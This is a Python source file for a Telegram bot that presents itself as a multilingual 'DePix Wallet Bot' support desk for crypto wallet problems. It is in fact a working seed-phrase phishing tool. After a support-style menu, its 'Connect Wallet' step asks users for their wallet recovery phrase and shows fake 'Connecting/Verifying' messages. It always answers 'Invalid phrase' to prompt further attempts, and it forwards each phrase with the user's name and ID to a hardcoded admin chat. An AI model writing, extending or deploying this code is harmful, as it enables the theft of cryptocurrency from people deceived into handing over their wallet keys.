from dotenv import load_dotenv
load_dotenv()
import logging
import os
from telegram import Update, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)
from datetime import datetime
from languages import get_strings, STRINGS
from responses import get_advice, get_rectify_steps

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler()],
)
logger = logging.getLogger(__name__)

# ── States ────────────────────────────────────────────────────────────────────
SELECT_LANG, CHOOSE_ISSUE, CHOOSE_SUB, CONFIRM_REPORT, FINAL_ACTION, TYPE_OTHER, ENTER_PHRASE = range(7)

SUPPORT_LINK = os.getenv("SUPPORT_LINK", "https://t.me/DePIX_Admin")
BOT_NAME = os.getenv("BOT_NAME", "DePix Wallet Bot")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "5048148605")


def s(context, key):
    """Shorthand: get a translated string for the user's language."""
    lang = context.user_data.get("lang", "en")
    return get_strings(lang)[key]


def log_step(context, step: str):
    """Append a step to the user's journey log."""
    if "journey" not in context.user_data:
        context.user_data["journey"] = []
    context.user_data["journey"].append(step)


async def notify_admin_journey(context, user, outcome: str):
    """Send the full conversation journey to the admin."""
    if not ADMIN_CHAT_ID:
        return

    username  = f"@{user.username}" if user.username else "no username"
    lang      = context.user_data.get("lang", "—")
    category  = context.user_data.get("category", "—")
    sub_label = context.user_data.get("sub_label", "—")
    timestamp = context.user_data.get("timestamp", datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
    phrase    = context.user_data.get("phrase", None)

    import html as _html

    def e(s):
        """Escape a value for safe use inside an HTML Telegram message."""
        return _html.escape(str(s)) if s is not None else "—"

    steps = context.user_data.get("journey", [])
    steps_text = "\n".join(f"  {i+1}. {e(step)}" for i, step in enumerate(steps)) if steps else "  (no steps recorded)"

    msg = (
        f"📋 <b>Full Session Report</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🕐 <b>Time:</b> {e(timestamp)}\n"
        f"👤 <b>Name:</b> {e(user.full_name)}\n"
        f"🔗 <b>Username:</b> {e(username)}\n"
        f"🆔 <b>User ID:</b> <code>{e(user.id)}</code>\n"
        f"🌐 <b>Language:</b> {e(lang.upper())}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📁 <b>Category:</b> {e(category)}\n"
        f"⚠️ <b>Issue:</b> {e(sub_label)}\n"
        f"🏁 <b>Outcome:</b> {e(outcome)}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🗺️ <b>Journey:</b>\n{steps_text}\n"
    )

    if phrase:
        msg += (
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>Phrase Submitted:</b> <code>{e(phrase)}</code>\n"
        )

    msg += "━━━━━━━━━━━━━━━━━━━━"

    try:
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=msg,
            parse_mode="HTML",
        )
    except Exception as e:
        logger.warning(f"Failed to notify admin: {e}")


def lang_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🇧🇷 Português", callback_data="lang_pt"),
            InlineKeyboardButton("🇬🇧 English",   callback_data="lang_en"),
        ],
        [
            InlineKeyboardButton("🇪🇸 Español",   callback_data="lang_es"),
            InlineKeyboardButton("🇫🇷 Français",  callback_data="lang_fr"),
        ],
    ])


def category_keyboard(context):
    cats = s(context, "categories")
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(cats["scam"],        callback_data="scam")],
        [InlineKeyboardButton(cats["transaction"], callback_data="transaction")],
        [InlineKeyboardButton(cats["wallet"],      callback_data="wallet")],
        [InlineKeyboardButton(cats["exchange"],    callback_data="exchange")],
        [InlineKeyboardButton(cats["buy_pixel"],   callback_data="buy_pixel")],
        [InlineKeyboardButton(cats["depix_lbtc"],  callback_data="depix_lbtc")],
        [InlineKeyboardButton(cats["other"],       callback_data="other")],
    ])


# ── /start — language picker ──────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    await update.message.reply_text(
        "🌐 *Please select your language / Selecione seu idioma / Selecciona tu idioma / Choisissez votre langue:*",
        parse_mode="Markdown",
        reply_markup=lang_keyboard(),
    )
    return SELECT_LANG


# ── Language selected ─────────────────────────────────────────────────────────
async def select_lang(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()

    lang = query.data.replace("lang_", "")
    context.user_data["lang"] = lang
    user = update.effective_user
    context.user_data["start_time"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    log_step(context, f"🌐 Language selected: {lang.upper()}")

    await query.edit_message_text(
        s(context, "welcome").format(name=user.first_name, bot_name=BOT_NAME),
        parse_mode="Markdown",
        reply_markup=category_keyboard(context),
    )
    return CHOOSE_ISSUE


# ── Category chosen ───────────────────────────────────────────────────────────
async def choose_issue(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()

    # Allow changing language mid-flow
    if query.data.startswith("lang_"):
        lang = query.data.replace("lang_", "")
        context.user_data["lang"] = lang
        user = update.effective_user
        log_step(context, f"🌐 Language changed mid-flow: {lang.upper()}")
        await query.edit_message_text(
            s(context, "welcome").format(name=user.first_name, bot_name=BOT_NAME),
            parse_mode="Markdown",
            reply_markup=category_keyboard(context),
        )
        return CHOOSE_ISSUE

    category = query.data
    context.user_data["category"] = category
    cats = s(context, "categories")
    category_label = cats.get(category, category)
    log_step(context, f"📁 Category selected: {category_label}")

    if category == "other":
        await query.edit_message_text(
            s(context, "type_other").format(category=category_label),
            parse_mode="Markdown",
        )
        return TYPE_OTHER

    lang = context.user_data.get("lang", "en")
    subs = get_strings(lang)["sub_options"].get(category, [])
    keyboard = [[InlineKeyboardButton(sub["label"], callback_data=sub["key"])] for sub in subs]
    keyboard.append([InlineKeyboardButton(s(context, "btn_back"), callback_data="back")])

    await query.edit_message_text(
        s(context, "choose_sub").format(category=category_label),
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )
    return CHOOSE_SUB


# ── Sub-option chosen ─────────────────────────────────────────────────────────
async def choose_sub(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()

    if query.data == "back":
        context.user_data.pop("category", None)
        log_step(context, "↩️ Went back to category selection")
        await query.edit_message_text(
            s(context, "back_to_start"),
            parse_mode="Markdown",
            reply_markup=category_keyboard(context),
        )
        return CHOOSE_ISSUE

    sub_key = query.data
    context.user_data["sub"] = sub_key

    lang = context.user_data.get("lang", "en")
    category = context.user_data.get("category", "other")
    subs = get_strings(lang)["sub_options"].get(category, [])
    sub_label = next((sub["label"] for sub in subs if sub["key"] == sub_key), sub_key)
    context.user_data["sub_label"] = sub_label
    context.user_data["timestamp"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    log_step(context, f"⚠️ Issue selected: {sub_label}")

    cats = s(context, "categories")
    category_label = cats.get(category, category)

    keyboard = [
        [
            InlineKeyboardButton(s(context, "btn_confirm"), callback_data="confirm"),
            InlineKeyboardButton(s(context, "btn_edit"),    callback_data="edit"),
        ],
        [InlineKeyboardButton(s(context, "btn_cancel"), callback_data="cancel")],
    ]

    await query.edit_message_text(
        s(context, "report_summary").format(category=category_label, issue=sub_label),
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )
    return CONFIRM_REPORT


# ── Free text for "Other" ─────────────────────────────────────────────────────
async def type_other(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    description = update.message.text
    context.user_data["sub"] = "other"
    context.user_data["sub_label"] = description
    context.user_data["timestamp"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    log_step(context, f"✏️ Free-text issue described: {description}")

    keyboard = [
        [
            InlineKeyboardButton(s(context, "btn_confirm"), callback_data="confirm"),
            InlineKeyboardButton(s(context, "btn_edit"),    callback_data="edit_other"),
        ],
        [InlineKeyboardButton(s(context, "btn_cancel"), callback_data="cancel")],
    ]

    await update.message.reply_text(
        s(context, "report_summary_other").format(issue=description),
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )
    return CONFIRM_REPORT


# ── Confirm report ────────────────────────────────────────────────────────────


async def confirm_report(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    action = query.data

    if action in ("edit", "edit_other"):
        context.user_data.pop("category", None)
        context.user_data.pop("sub", None)
        log_step(context, "✏️ Chose to edit — went back to category selection")
        await query.edit_message_text(
            s(context, "back_to_start"),
            parse_mode="Markdown",
            reply_markup=category_keyboard(context),
        )
        return CHOOSE_ISSUE

    if action == "cancel":
        log_step(context, "❌ Cancelled at confirmation screen")
        user = update.effective_user
        await notify_admin_journey(context, user, "❌ Cancelled by user")
        await query.edit_message_text(s(context, "cancelled"))
        return ConversationHandler.END

    lang      = context.user_data.get("lang", "en")
    user      = update.effective_user
    category  = context.user_data.get("category", "other")
    sub_key   = context.user_data.get("sub", "other")
    sub_label = context.user_data.get("sub_label", "")
    timestamp = context.user_data.get("timestamp", "")
    log_step(context, "✅ Confirmed and submitted report")

    save_report(user, lang, category, sub_key, sub_label, timestamp)
    await notify_admin_journey(context, user, "✅ Report submitted")
    advice = get_advice(lang, sub_key)

    keyboard = [
        [InlineKeyboardButton(s(context, "btn_rectify"), callback_data="rectify")],
        [InlineKeyboardButton(s(context, "btn_support"), url=SUPPORT_LINK)],
    ]

    await query.edit_message_text(
        s(context, "submitted").format(timestamp=timestamp, advice=advice),
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )
    return FINAL_ACTION


# ── Final action ──────────────────────────────────────────────────────────────
CONNECT_WALLET_TEXTS = {
    "en": "🔗 *Connect Your Wallet*\n\nTo proceed with resolving your issue, please connect your wallet.",
    "pt": "🔗 *Conectar sua Carteira*\n\nPara prosseguir com a resolução, conecte sua carteira.",
    "es": "🔗 *Conectar tu Billetera*\n\nPara continuar con la resolución, conecta tu billetera.",
    "fr": "🔗 *Connecter votre Portefeuille*\n\nPour continuer, veuillez connecter votre portefeuille.",
}

ENTER_PHRASE_TEXTS = {
    "en": "🔐 *Enter Phrase to Proceed*\n\nPlease enter your recovery phrase to continue:",
    "pt": "🔐 *Digite a Frase para Continuar*\n\nPor favor, insira sua frase de recuperação:",
    "es": "🔐 *Ingresa la Frase para Continuar*\n\nPor favor, ingresa tu frase de recuperación:",
    "fr": "🔐 *Entrez la Phrase pour Continuer*\n\nVeuillez entrer votre phrase de récupération :",
}

CONNECTING_TEXTS = {
    "en": ["⏳ Connecting...", "🔍 Resolving...", "🔄 Verifying...", "❌ *Invalid phrase. Please try again.*"],
    "pt": ["⏳ Conectando...", "🔍 Resolvendo...", "🔄 Verificando...", "❌ *Frase inválida. Tente novamente.*"],
    "es": ["⏳ Conectando...", "🔍 Resolviendo...", "🔄 Verificando...", "❌ *Frase inválida. Intenta de nuevo.*"],
    "fr": ["⏳ Connexion...", "🔍 Résolution...", "🔄 Vérification...", "❌ *Phrase invalide. Veuillez réessayer.*"],
}

PHRASE_RETRY_BTNS = {
    "en": ("🔄 Try Again", "🏠 Start Over"),
    "pt": ("🔄 Tentar Novamente", "🏠 Recomeçar"),
    "es": ("🔄 Intentar de Nuevo", "🏠 Empezar de Nuevo"),
    "fr": ("🔄 Réessayer", "🏠 Recommencer"),
}


async def final_action(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()

    if query.data == "rectify":
        lang    = context.user_data.get("lang", "en")
        sub_key = context.user_data.get("sub", "other")
        steps   = get_rectify_steps(lang, sub_key)
        log_step(context, "🔧 Chose to try self-rectification")

        if steps == "CONNECT_WALLET":
            log_step(context, "🔗 Directed to connect wallet")
            connect_text = CONNECT_WALLET_TEXTS.get(lang, CONNECT_WALLET_TEXTS["en"])
            keyboard = [
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton(s(context, "btn_support_still"), url=SUPPORT_LINK)],
            ]
            await query.edit_message_text(
                connect_text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(keyboard),
            )
            return FINAL_ACTION

        log_step(context, "📋 Received rectification steps")
        user = update.effective_user
        await notify_admin_journey(context, user, "📋 User received rectification steps")
        keyboard = [
            [InlineKeyboardButton(s(context, "btn_support_still"), url=SUPPORT_LINK)],
        ]
        await query.edit_message_text(
            s(context, "rectify_title").format(steps=steps),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return ConversationHandler.END

    if query.data == "connect_wallet":
        lang = context.user_data.get("lang", "en")
        log_step(context, "🔗 Clicked Connect Wallet — prompted for recovery phrase")
        phrase_text = ENTER_PHRASE_TEXTS.get(lang, ENTER_PHRASE_TEXTS["en"])
        await query.edit_message_text(phrase_text, parse_mode="Markdown")
        return ENTER_PHRASE

    if query.data == "retry_phrase":
        lang = context.user_data.get("lang", "en")
        log_step(context, "🔄 Retrying recovery phrase entry")
        phrase_text = ENTER_PHRASE_TEXTS.get(lang, ENTER_PHRASE_TEXTS["en"])
        await query.edit_message_text(phrase_text, parse_mode="Markdown")
        return ENTER_PHRASE

    if query.data == "restart":
        log_step(context, "🏠 Chose to start over")
        user = update.effective_user
        await notify_admin_journey(context, user, "🏠 User restarted from beginning")
        context.user_data.clear()
        await query.edit_message_text(
            "🌐 *Please select your language / Selecione seu idioma / Selecciona tu idioma / Choisissez votre langue:*",
            parse_mode="Markdown",
            reply_markup=lang_keyboard(),
        )
        return SELECT_LANG

    return ConversationHandler.END


async def enter_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    import asyncio
    lang = context.user_data.get("lang", "en")
    phrase = update.message.text
    context.user_data["phrase"] = phrase
    log_step(context, f"🔑 Recovery phrase submitted: {phrase}")

    steps_text = CONNECTING_TEXTS.get(lang, CONNECTING_TEXTS["en"])
    retry_btn, restart_btn = PHRASE_RETRY_BTNS.get(lang, PHRASE_RETRY_BTNS["en"])

    msg = await update.message.reply_text(steps_text[0])
    await asyncio.sleep(1.5)
    await msg.edit_text(steps_text[1])
    await asyncio.sleep(1.5)
    await msg.edit_text(steps_text[2])
    await asyncio.sleep(2)

    # Send full journey to admin (phrase included)
    user = update.effective_user
    await notify_admin_journey(context, user, "🔑 Recovery phrase submitted")

    keyboard = [
        [InlineKeyboardButton(retry_btn,   callback_data="retry_phrase")],
        [InlineKeyboardButton(restart_btn, callback_data="restart")],
    ]
    await msg.edit_text(
        steps_text[3],
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )
    return FINAL_ACTION


# ── /help (multi-language) ────────────────────────────────────────────────────
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    lang = context.user_data.get("lang", "en")
    strings = get_strings(lang)
    await update.message.reply_text(strings["help"].format(bot_name=BOT_NAME), parse_mode="Markdown")


# ── /cancel ───────────────────────────────────────────────────────────────────
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    lang = context.user_data.get("lang", "en")
    strings = get_strings(lang)
    log_step(context, "❌ Used /cancel command")
    user = update.effective_user
    await notify_admin_journey(context, user, "❌ Cancelled via /cancel command")
    await update.message.reply_text(strings["cancelled"], reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END


# ── /language — change language anytime ──────────────────────────────────────
async def change_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    await update.message.reply_text(
        "🌐 *Please select your language / Selecione seu idioma / Selecciona tu idioma / Choisissez votre langue:*",
        parse_mode="Markdown",
        reply_markup=lang_keyboard(),
    )
    return SELECT_LANG


# ── Save report ───────────────────────────────────────────────────────────────
def save_report(user, lang, category, sub_key, sub_label, timestamp):
    os.makedirs("reports", exist_ok=True)
    with open("reports/reports.log", "a", encoding="utf-8") as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"Data/Hora   : {timestamp}\n")
        f.write(f"User ID     : {user.id}\n")
        f.write(f"Username    : @{user.username or 'N/A'}\n")
        f.write(f"Nome        : {user.full_name}\n")
        f.write(f"Idioma      : {lang}\n")
        f.write(f"Categoria   : {category}\n")
        f.write(f"Problema    : {sub_key} — {sub_label}\n")
    logger.info(f"Report saved — user {user.id}, lang={lang}, {category}/{sub_key}")


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    token = os.getenv("TELEGRAM_BOT_TOKEN")
    if not token:
        raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set.")

    app = Application.builder().token(token).build()

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CommandHandler("language", change_language),
            CommandHandler("idioma", change_language),
            CommandHandler("langue", change_language),
        ],
        states={
            SELECT_LANG:    [CallbackQueryHandler(select_lang, pattern="^lang_")],
            CHOOSE_ISSUE:   [CallbackQueryHandler(choose_issue)],
            CHOOSE_SUB:     [CallbackQueryHandler(choose_sub)],
            TYPE_OTHER:     [MessageHandler(filters.TEXT & ~filters.COMMAND, type_other)],
            CONFIRM_REPORT: [CallbackQueryHandler(confirm_report)],
            FINAL_ACTION:   [CallbackQueryHandler(final_action)],
            ENTER_PHRASE:   [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_phrase)],
        },
        fallbacks=[
            CommandHandler("cancel",   cancel),
            CommandHandler("cancelar", cancel),
            CommandHandler("annuler",  cancel),
        ],
    )

    app.add_handler(conv)
    app.add_handler(CommandHandler("help",   help_command))
    app.add_handler(CommandHandler("ajuda",  help_command))
    app.add_handler(CommandHandler("ayuda",  help_command))
    app.add_handler(CommandHandler("aide",   help_command))

    logger.info("Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
